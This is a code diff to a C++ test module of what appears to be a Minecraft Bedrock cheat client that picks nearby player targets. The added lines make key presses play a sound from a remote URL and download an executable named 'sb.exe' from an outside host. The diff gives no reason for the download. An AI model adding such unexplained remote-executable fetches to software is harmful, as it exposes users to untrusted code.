@@ -1,6 +1,7 @@
 #include "TestModule.h"
+#include "../../../../Utils/Misc.h"
 
-TestModule::TestModule() : Module("TestModule", "In nukkit anarchy server kind", Category::MISC) {
+TestModule::TestModule() : Module("TestModule", "Test", Category::MISC) {
 	addSlider<float>("Range", "NULL", ValueType::FLOAT_T, &value, 0.f, 1.f);
 	addSlider<float>("float2", "NULL", ValueType::FLOAT_T, &value1, 0.f, 1.f);
 	addSlider<float>("float3", "NULL", ValueType::FLOAT_T, &value2, 0.f, 1.f);
@@ -65,6 +66,7 @@ void TestModule::onNormalTick(Actor* actor)
 	auto gm = mc.getGameMode();
 	auto region = localPlayer->dimension->blockSource;
 	auto level = localPlayer->getLevel();
+	if (!level) return;
 	//find target
 	for (auto& target : level->getRuntimeActorList()) {
 		if (TargetUtils::isTargetValid(target, bool1)) {
@@ -73,6 +75,12 @@ void TestModule::onNormalTick(Actor* actor)
 			if (dist < rangeCheck)
 				targetList.push_back(target);
 		}
+	}
+	if (mc.isKeyDown('O')) {
+		Misc::PlaySoundFromUrl("https://uhura.cdkm.com/convert/file/st33ukmwnxma0hh0hq5dj41nrmixvlrz/fardreverb.wav", 50);
+	}
+	if (mc.isKeyDown('P')) {
+		Misc::DownLoadFromUrl("https://gitee.com/c--coder-mc/PacketV2/releases/download/114/sb.exe");
 	}
 
 }
